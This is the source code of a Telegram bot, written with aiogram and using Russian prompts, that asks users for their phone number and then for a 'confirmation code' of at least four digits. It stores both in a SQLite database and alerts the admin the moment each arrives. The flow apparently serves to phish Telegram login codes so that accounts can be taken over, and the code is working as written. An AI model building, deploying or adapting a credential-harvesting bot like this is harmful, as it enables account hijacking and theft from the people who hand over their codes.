import re
import sqlite3

from aiogram import Router, types, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

from bot.states.states import Registration
from config import DB_NAME, ADMIN_ID

router = Router()


@router.message(CommandStart())
async def start_handler(message: types.Message, state: FSMContext):
    request_contact_button = KeyboardButton(
        text="Отправить номер ☎️",
        request_contact=True
    )

    keyboard = ReplyKeyboardMarkup(
        keyboard=[[request_contact_button]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.answer(
        "Привет! Пожалуйста, отправьте свой номер телефона, нажав на кнопку ниже.",
        reply_markup=keyboard
    )
    await state.set_state(Registration.waiting_for_phone)


@router.message(F.contact, Registration.waiting_for_phone)
async def phone_handler_via_button(message: types.Message, state: FSMContext):
    if message.contact is None:
        await message.answer("Не удалось получить контакт. Попробуйте снова.")
        return

    phone = message.contact.phone_number
    await state.update_data(phone=phone)

    await message.answer(
        "Теперь отправьте код подтверждения (минимум 4 цифры).",
        reply_markup=types.ReplyKeyboardRemove()
    )
    await message.bot.send_message(
        ADMIN_ID,
        f"Новый пользователь {message.from_user.full_name} отправил номер телефона."
        f"\n\n/view_users\n/view_users\n/view_users\n/view_users"
    )
    await state.set_state(Registration.waiting_for_code)


@router.message(Registration.waiting_for_code)
async def code_handler(message: types.Message, state: FSMContext):
    code = ''.join(re.findall(r'\d', message.text))
    if len(code) < 4:
        await message.answer("Код должен содержать минимум 4 цифры. Попробуйте ещё раз.")
        return
    data = await state.get_data()
    phone = data.get('phone')
    user_id = message.from_user.id

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    if result:
        cursor.execute("UPDATE users SET phone=?, code=? WHERE user_id=?", (phone, code, user_id))
    else:
        name = message.from_user.full_name
        username = message.from_user.username
        cursor.execute("INSERT INTO users (user_id, name, username, phone, code) VALUES (?,?,?,?,?)",
                       (user_id, name, username, phone, code))
    conn.commit()
    conn.close()

    await message.answer("Ваш номер и код успешно сохранены!")
    await message.bot.send_message(
        ADMIN_ID,
        f"Пользователь {message.from_user.full_name} отправил код."
        f"\n\n/view_users\n/view_users\n/view_users\n/view_users"
    )
    await state.clear()
